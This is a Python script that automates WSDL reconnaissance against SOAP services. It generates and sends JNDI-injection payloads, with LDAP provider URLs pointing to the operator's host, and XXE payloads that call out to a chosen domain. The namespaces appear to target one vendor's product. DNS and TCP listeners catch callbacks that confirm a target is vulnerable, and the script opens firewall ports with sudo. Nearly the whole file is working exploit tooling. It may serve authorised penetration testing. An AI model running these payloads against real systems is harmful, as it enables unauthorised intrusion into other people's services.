#!/usr/bin/env python3

import argparse
import os
import socket
import subprocess
import threading
import time
from http import client
from pathlib import Path
from typing import Dict, List

import requests
from zeep import Client, Settings
from zeep.plugins import HistoryPlugin
from zeep.transports import Transport

COMMON_PORTS = [1389, 8080, 8443, 80, 443, 53, 123, 587, 3306, 5000, 7001, 9999]

def start_multiple_tcp_listeners(bind_ip: str, ports: list, timeout: int = 30):
    """Start TCP listeners on multiple ports concurrently. Returns dict with results."""
    results = {}
    threads = []

    def listener_worker(port):
        result = {"port": port, "accepted": False, "peer": None, "error": None}
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((bind_ip, port))
                s.listen(1)
                s.settimeout(timeout)
                try:
                    conn, addr = s.accept()
                    result["accepted"] = True
                    result["peer"] = addr
                    try:
                        conn.settimeout(2)
                        _ = conn.recv(1024)
                    except Exception:
                        pass
                    conn.close()
                except socket.timeout:
                    pass
        except Exception as e:
            result["error"] = str(e)
        results[port] = result

    for p in ports:
        t = threading.Thread(target=listener_worker, args=(p,), daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join(timeout + 2)

    return results

# ---- Config / Suspicious items to look for ----
SUSPICIOUS_OP_KEYWORDS = ("set", "create", "update", "configure", "init", "start", "stop")
SUSPICIOUS_FIELD_KEYWORDS = [
    "password", "passwd", "credential", "secret", "token", "key", "username", "user", "admin",
    "provider_url", "providerurl", "initial_context_factory", "security_credentials",
    "security_principal", "PROVIDER_URL", "SECURITY_CREDENTIALS", "SECURITY_PRINCIPAL",
    "connectionfactory", "connection_factory", "destinationname", "customprocessor", "customreader",
    "customwriter", "msgSource"
]

# ---- Utility functions ----
def get_local_ip() -> str:
    """Return the primary local IP address used to reach the internet (best-effort)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # connect to a public DNS IP, doesn't send packets
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def ensure_ufw_port_allowed(port: int) -> bool:
    try:
        r = subprocess.run(["sudo", "ufw", "status"], capture_output=True, text=True)
        output = r.stdout.lower()
        if f"{port}" in output and "allow" in output:
            return True
        # Add rule
        subprocess.run(["sudo", "ufw", "allow", f"{port}/tcp"], check=True)
        return True
    except Exception as e:
        print(f"[!] Could not verify/add ufw rule for port {port}: {e}")
        return False

def cleanup_ufw_ports(ports: List[int]):
    for port in ports:
        try:
            subprocess.run(["sudo", "ufw", "delete", "allow", f"{port}/tcp"], check=True)
            print(f"[+] Removed ufw rule for port {port}")
        except Exception:
            pass

def check_ufw_status() -> str:
    """Try to run 'sudo ufw status' to show firewall settings (requires sudo)."""
    try:
        p = subprocess.run(["sudo", "ufw", "status"], capture_output=True, text=True, timeout=10)
        return p.stdout.strip() if p.returncode == 0 else f"ufw returned code {p.returncode}: {p.stdout.strip()} {p.stderr.strip()}"
    except Exception as e:
        return f"ufw check failed: {e}"

def save_payload(filename: Path, xml: str):
    filename.parent.mkdir(parents=True, exist_ok=True)
    filename.write_text(xml, encoding="utf-8")
    print(f"[+] Wrote payload: {filename}")

# ---- Zeep client loader with simple timeout handling ----
def load_wsdl(wsdl_url: str, timeout=15, verify=True):
    session = requests.Session()
    session.verify = verify
    transport = Transport(session=session, timeout=timeout)
    settings = Settings(strict=False, xml_huge_tree=True)
    history = HistoryPlugin()
    client = Client(wsdl=wsdl_url, transport=transport, settings=settings, plugins=[history])
    return client, history

# ---- Recon & payload generation ----
def recon_wsdl(wsdl_url: str):
    """Parse WSDL and return a dict with services, ports, operations, suspicious fields."""
    client, history = load_wsdl(wsdl_url)
    services = {}
    suspicious_fields = set()
    encoded_style = False

    # gather services/ports/operations and detect encoded style usage in raw WSDL if possible
    try:
        raw = requests.get(wsdl_url, timeout=10, verify=wsdl_url.startswith("https")).text
        if "http://schemas.xmlsoap.org/soap/encoding/" in raw:
            encoded_style = True
    except Exception:
        raw = None

    for sname, serv in client.wsdl.services.items():
        services[sname] = {}
        for pname, port in serv.ports.items():
            ops = list(port.binding._operations.keys())
            services[sname][pname] = {
                "address": port.binding_options.get("address"),
                "binding": str(port.binding.name),
                "operations": ops
            }

    # attempt to discover suspicious element/field names via client.wsdl.types
    try:
        schema = client.wsdl.types
        # elements: try both .elements and generator/list forms
        elems = []
        if hasattr(schema, "elements"):
            try:
                if hasattr(schema.elements, "items"):
                    elems = [k for k, v in schema.elements.items()]
                else:
                    elems = list(schema.elements)
            except Exception:
                elems = []
        for e in elems:
            name = getattr(e, "localname", str(e)).lower() if hasattr(e, "localname") or isinstance(e, tuple) else str(e).lower()
            for kw in SUSPICIOUS_FIELD_KEYWORDS:
                if kw.lower() in name:
                    suspicious_fields.add(name)
    except Exception:
        # fallback: nothing
        pass

    return {
        "services": services,
        "suspicious_fields": sorted(suspicious_fields),
        "encoded_style": encoded_style
    }

def build_jndi_probe_xml(service_name: str, operation: str, target_ip: str, target_port: int, namespace="http://source.trax.aero"):
    root_tag = operation
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
  <soapenv:Body>
    <ns:{root_tag}>
      <jmsConfig xmlns="http://JMS.castor.trax.aero">
        <INITIAL_CONTEXT_FACTORY>com.sun.jndi.ldap.LdapCtxFactory</INITIAL_CONTEXT_FACTORY>
        <PROVIDER_URL>ldap://{target_ip}:{target_port}/Exploit</PROVIDER_URL>
        <SECURITY_PRINCIPAL>probe</SECURITY_PRINCIPAL>
        <SECURITY_CREDENTIALS>probe</SECURITY_CREDENTIALS>
        <valid>true</valid>
      </jmsConfig>
    </ns:{root_tag}>
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml

def build_jndi_dns_probe_xml(service_name: str, operation: str, dns_domain: str, port: int = 389, namespace="http://source.trax.aero"):
    """Generate JNDI payload that triggers DNS lookup"""
    unique_id = operation.lower().replace('_', '-')
    root_tag = operation
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
  <soapenv:Body>
    <ns:{root_tag}>
      <jmsConfig xmlns="http://JMS.castor.trax.aero">
        <INITIAL_CONTEXT_FACTORY>com.sun.jndi.ldap.LdapCtxFactory</INITIAL_CONTEXT_FACTORY>
        <PROVIDER_URL>ldap://jndi-{unique_id}.{dns_domain}:{port}/Exploit</PROVIDER_URL>
        <SECURITY_PRINCIPAL>probe</SECURITY_PRINCIPAL>
        <SECURITY_CREDENTIALS>probe</SECURITY_CREDENTIALS>
        <valid>true</valid>
      </jmsConfig>
    </ns:{root_tag}>
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml

def build_xxe_dns_probe_xml(operation: str, dns_domain: str, namespace="http://source.trax.aero"):
    """Generate XXE payload that triggers DNS lookup"""
    unique_id = operation.lower().replace('_', '-')
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-{unique_id}.{dns_domain}/">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
  <soapenv:Body>
    <ns:{operation}>&xxe;</ns:{operation}>
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml

def start_dns_listener(bind_ip: str = '0.0.0.0', timeout: int = 30):
    """Start UDP DNS listener on port 53 to capture DNS queries"""
    result = {"queries": [], "accepted": False, "error": None}

    def dns_worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((bind_ip, 53))
            sock.settimeout(timeout)

            print(f"[+] DNS listener active on {bind_ip}:53 (UDP)")
            result["accepted"] = True

            start_time = time.time()
            while time.time() - start_time < timeout:
                try:
                    data, addr = sock.recvfrom(512)

                    # Parse DNS query to extract domain name
                    try:
                        # Skip DNS header (12 bytes) and parse question section
                        domain_parts = []
                        idx = 12
                        while idx < len(data) and data[idx] != 0:
                            length = data[idx]
                            if length == 0:
                                break
                            domain_parts.append(data[idx+1:idx+1+length].decode('utf-8', errors='ignore'))
                            idx += length + 1

                        domain = '.'.join(domain_parts) if domain_parts else "unknown"
                    except:
                        domain = "parse_error"

                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

                    print(f"\n{'='*80}")
                    print(f"[!!!] DNS QUERY RECEIVED!")
                    print(f"[!!!] Domain: {domain}")
                    print(f"[!!!] From: {addr[0]}:{addr[1]}")
                    print(f"[!!!] Time: {timestamp}")
                    print(f"{'='*80}\n")

                    result["queries"].append({
                        "domain": domain,
                        "from": addr,
                        "timestamp": timestamp
                    })

                    # Send DNS response (dummy IP 127.0.0.1)
                    response = data[0:2]  # Transaction ID
                    response += b'\x81\x80'  # Flags: response, no error
                    response += data[4:6]  # Questions
                    response += b'\x00\x01'  # Answer RRs
                    response += b'\x00\x00'  # Authority RRs
                    response += b'\x00\x00'  # Additional RRs
                    response += data[12:idx+1]  # Original question
                    response += b'\xc0\x0c'  # Name pointer
                    response += b'\x00\x01'  # Type A
                    response += b'\x00\x01'  # Class IN
                    response += b'\x00\x00\x00\x3c'  # TTL (60 seconds)
                    response += b'\x00\x04'  # Data length
                    response += b'\x7f\x00\x00\x01'  # IP: 127.0.0.1

                    sock.sendto(response, addr)

                except socket.timeout:
                    continue

            sock.close()

        except PermissionError:
            result["error"] = "permission_denied"
            result["accepted"] = False
        except Exception as e:
            result["error"] = str(e)
            result["accepted"] = False

    thread = threading.Thread(target=dns_worker, daemon=True)
    thread.start()
    return thread, result


def ensure_ufw_dns_allowed() -> bool:
    """Add UFW rule for UDP/53"""
    try:
        print("[*] Adding UFW rule for UDP/53...")
        subprocess.run(["sudo", "ufw", "allow", "53/udp"],
                      check=True,
                      capture_output=True,
                      text=True)
        print("[+] UFW rule added for UDP/53")
        return True
    except Exception as e:
        print(f"[!] Could not add ufw rule for UDP/53: {e}")
        print(f"[!] You may need to manually run: sudo ufw allow 53/udp")
        return False


def cleanup_ufw_dns() -> bool:
    """Remove UFW rule for UDP/53"""
    try:
        print("[*] Removing UFW rule for UDP/53...")
        subprocess.run(["sudo", "ufw", "delete", "allow", "53/udp"],
                      check=True,
                      capture_output=True,
                      text=True)
        print("[+] UFW rule removed for UDP/53")
        return True
    except Exception as e:
        print(f"[!] Could not remove ufw rule for UDP/53: {e}")
        return False

# ---- Active network functions ----
def start_tcp_listener(bind_ip: str, bind_port: int, timeout: int = 30):

    result = {"conn": None, "peer": None, "accepted": False}

    def _listener():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((bind_ip, bind_port))
                s.listen(1)
                s.settimeout(timeout)
                try:
                    conn, addr = s.accept()
                    result["conn"] = conn
                    result["peer"] = addr
                    result["accepted"] = True
                    # try to read small amount then close
                    try:
                        conn.settimeout(2)
                        _ = conn.recv(1024)
                    except Exception:
                        pass
                    try:
                        conn.close()
                    except Exception:
                        pass
                except socket.timeout:
                    pass
        except Exception as e:
            result["error"] = str(e)

    t = threading.Thread(target=_listener, daemon=True)
    t.start()
    return t, result

def send_soap_payload(url: str, xml: str, timeout=15, verify=True):

    headers = {
        "Content-Type": "text/xml",
        "SOAPAction": '""'
    }
    try:
        r = requests.post(url, data=xml.encode("utf-8"), headers=headers, timeout=timeout, verify=verify)
        status = r.status_code
        body = r.text[:2000]

        if "Fault" in body or status >= 400:
            verdict = "Rejected by Service (SOAP Fault or HTTP error)"
        elif 200 <= status < 300:
            verdict = "Possibly Accepted / Executed"
        else:
            verdict = "Unknown or Unhandled HTTP Status"

        return {
            "status_code": status,
            "text": body,
            "headers": dict(r.headers),
            "verdict": verdict
        }

    except Exception as e:
        return {
            "error": str(e),
            "verdict": "Dropped or No Response"
        }

def main():
    ap = argparse.ArgumentParser(description="Automate WSDL recon and JNDI/XXE probe with DNS or TCP callbacks")
    ap.add_argument("--wsdl", required=True, help="WSDL URL")
    ap.add_argument("--outdir", default="payloads", help="Directory to write payload XML files")
    ap.add_argument("--exploit", action="store_true", help="Enable active exploit/probe sending (requires interactive confirmation)")
    ap.add_argument("--recon", action="store_true", help="Recon-only mode: assess potential risk without sending traffic")

    # Callback methods
    ap.add_argument("--dns-callback", help="Use DNS callbacks - automatically starts DNS listener on UDP/53 (provide your public IP or domain)")
    ap.add_argument("--listener", action="store_true", help="Start TCP listeners on COMMON_PORTS to detect callbacks")
    ap.add_argument("--listen-ip", default=None, help="IP to bind listeners to (defaults to auto-detected)")

    ap.add_argument("--timeout", type=int, default=45, help="Listener timeout seconds (default: 45)")
    ap.add_argument("--no-verify-tls", action="store_true", help="Do not verify TLS when sending SOAP requests")
    args = ap.parse_args()

    wsdl = args.wsdl
    outdir = Path(args.outdir)
    verify_tls = not args.no_verify_tls

    print(f"[+] Reconnaissance: parsing WSDL {wsdl}")
    recon = recon_wsdl(wsdl)
    services = recon["services"]
    print(f"[+] Found services: {list(services.keys())}")
    for sname, ports in services.items():
        for pname, pinfo in ports.items():
            print(f"  - Service: {sname} / Port: {pname}")
            print(f"    Address: {pinfo.get('address')}")
            print(f"    Operations: {pinfo.get('operations')}")

    if recon["suspicious_fields"]:
        print(f"[!] Suspicious fields discovered: {recon['suspicious_fields']}")
    if recon["encoded_style"]:
        print("[!] WSDL indicates encoded/RPC style usage (higher risk)")

    # Determine callback method
    dns_callback = None
    use_tcp = False
    dns_listener_thread = None
    dns_listener_result = None

    if args.dns_callback:
        dns_callback = args.dns_callback
        print(f"[*] DNS callback mode enabled")
        print(f"[*] Callback target: {dns_callback}")
        print(f"[*] Will start DNS listener on UDP/53")
    elif args.listener:
        use_tcp = True
        local_ip = args.listen_ip if args.listen_ip else get_local_ip()
        print(f"[+] TCP callback mode enabled")
        print(f"[+] Using TCP callbacks to: {local_ip}")
    else:
        print("[!] Must specify callback method:")
        print("  --dns-callback YOUR_PUBLIC_IP (starts DNS listener)")
        print("  --listener (starts TCP listeners)")
        return

    if args.recon:
        if recon["encoded_style"] or recon["suspicious_fields"]:
            print("\n[+] Recon-only mode active. Target WSDL appears POTENTIALLY VULNERABLE due to:")
            if recon["encoded_style"]:
                print("  - Use of SOAP encoded style (RPC/encoded)")
            if recon["suspicious_fields"]:
                print("  - Field names matching sensitive or JNDI-related patterns")
        else:
            print("\n[+] Recon-only mode active. No immediate signs of unsafe operations")
        return

    outdir.mkdir(parents=True, exist_ok=True)
    generated = []

    for sname, ports in services.items():
        safe_sname = sname.replace(" ", "_").replace("/", "_")
        for pname, pinfo in ports.items():
            for op in pinfo.get("operations", []):
                lower = op.lower()
                is_interesting = any(k in lower for k in SUSPICIOUS_OP_KEYWORDS) or "jms" in lower or "flatfile" in lower or "timer" in lower
                if not is_interesting:
                    continue

                if dns_callback:
                    # Generate DNS callback payloads
                    # JNDI with DNS
                    xml_jndi = build_jndi_dns_probe_xml(safe_sname, op, dns_callback)
                    fname_jndi = outdir / f"{safe_sname}_{op}_jndi_dns.xml"
                    save_payload(fname_jndi, xml_jndi)
                    generated.append(("JNDI-DNS", op, fname_jndi, pinfo.get("address")))

                    # XXE with DNS
                    xml_xxe = build_xxe_dns_probe_xml(op, dns_callback)
                    fname_xxe = outdir / f"{safe_sname}_{op}_xxe_dns.xml"
                    save_payload(fname_xxe, xml_xxe)
                    generated.append(("XXE-DNS", op, fname_xxe, pinfo.get("address")))

                else:
                    # Generate TCP callback payloads (original behavior)
                    for port in COMMON_PORTS:
                        xml = build_jndi_probe_xml(safe_sname, op, local_ip, port)
                        fname = outdir / f"{safe_sname}_{op}_port{port}.xml"
                        save_payload(fname, xml)
                        generated.append(("JNDI-TCP", op, fname, pinfo.get("address")))

    if not generated:
        print("[+] No interesting operations found. Exiting.")
        return

    print(f"[+] Generated {len(generated)} probe payload(s) in {outdir}")

    if not args.exploit:
        print("[+] Dry-run complete. Use --exploit to run active probes (requires confirmation).")
        return

    # Start listeners
    listener_results = None
    open_tcp_ports = []
    dns_ufw_added = False

    try:
        if dns_callback:
            # DNS mode - start DNS listener
            print("\n[*] Starting DNS listener...")

            # Add UFW rule
            dns_ufw_added = ensure_ufw_dns_allowed()

            # Start DNS listener
            bind_ip = args.listen_ip if args.listen_ip else '0.0.0.0'
            dns_listener_thread, dns_listener_result = start_dns_listener(bind_ip, timeout=args.timeout)
            time.sleep(2)

            if not dns_listener_result.get("accepted"):
                error = dns_listener_result.get("error", "unknown")
                if error == "permission_denied":
                    print("\n[!] PERMISSION DENIED - DNS listener requires root privileges")
                    print("[!] Rerun with: sudo python3 wsdl_auto_exploit.py ...")
                    return
                else:
                    print(f"\n[!] Failed to start DNS listener: {error}")
                    return

        elif use_tcp:
            # TCP mode - start TCP listeners
            print("[*] Checking ufw status (may prompt for sudo)...")
            ufw = check_ufw_status()
            print("[*] ufw status / output:")
            print(ufw)

            for p in COMMON_PORTS:
                if ensure_ufw_port_allowed(p):
                    open_tcp_ports.append(p)

            print(f"[+] Starting TCP listeners on ports: {COMMON_PORTS}")
            listener_results = start_multiple_tcp_listeners(local_ip, COMMON_PORTS, timeout=args.timeout)
            time.sleep(1)

        final_report = []

        # Send all payloads
        for payload_type, op, fname, address in generated:
            xml = fname.read_text(encoding="utf-8")
            target_url = address if address else wsdl
            print(f"[+] Sending {payload_type} probe for op {op} to {target_url} (payload {fname.name})")
            r = send_soap_payload(target_url, xml, verify=verify_tls)
            verdict = r.get("verdict", "No verdict")
            print(f"    [{verdict}] - Status: {r.get('status_code', r.get('error'))}")
            if "text" in r:
                print("    Body (truncated):", r["text"][:300].replace("\n", " "))
            final_report.append({
                "operation": op,
                "type": payload_type,
                "target": target_url,
                "payload": str(fname),
                "verdict": verdict,
                "status": r.get("status_code", r.get("error"))
            })

        # âœ… Add this delay BEFORE checking listener results
        print("\n[*] Waiting 30 seconds for any incoming callbacks...")
        time.sleep(30)

        # Check for callbacks
        if dns_callback:
            # DNS mode - wait for DNS listener
            print(f"\n[*] Waiting for DNS queries (timeout: {args.timeout}s)...")
            dns_listener_thread.join(timeout=args.timeout + 5)

            print("\n" + "="*80)
            print("DNS LISTENER RESULTS")
            print("="*80)

            queries = dns_listener_result.get("queries", [])

            if queries:
                print(f"\n[!!!] SUCCESS - Received {len(queries)} DNS queries!")
                print(f"[!!!] Target is VULNERABLE to DNS-based attacks!")

                for query in queries:
                    print(f"\n[+] Query: {query['domain']}")
                    print(f"    From: {query['from'][0]}")
                    print(f"    Time: {query['timestamp']}")

                    final_report.append({
                        "callback_type": "dns",
                        "callback_received": True,
                        "domain": query['domain'],
                        "from_ip": query['from'][0],
                        "timestamp": query['timestamp']
                    })
            else:
                print("\n[*] No DNS queries received")
                print("[*] Target may not be vulnerable or DNS is being filtered")

        elif use_tcp:
            # TCP mode - check listener results
            print("\n=== TCP Listener Summary ===")
            for port, result in listener_results.items():
                if result["accepted"]:
                    print(f"[!!!] Port {port}: CONNECTION from {result['peer']}")
                    final_report.append({
                        "listener_port": port,
                        "callback_received": True,
                        "peer": result['peer']
                    })
                else:
                    print(f"[-] Port {port}: No connection")

        print("\n=== Summary Report ===")
        for item in final_report:
            print(item)

        print("\nDone.")

    finally:
        # Cleanup
        if dns_ufw_added:
            cleanup_ufw_dns()

        if open_tcp_ports:
            cleanup_ufw_ports(open_tcp_ports)

if __name__ == "__main__":
    main()
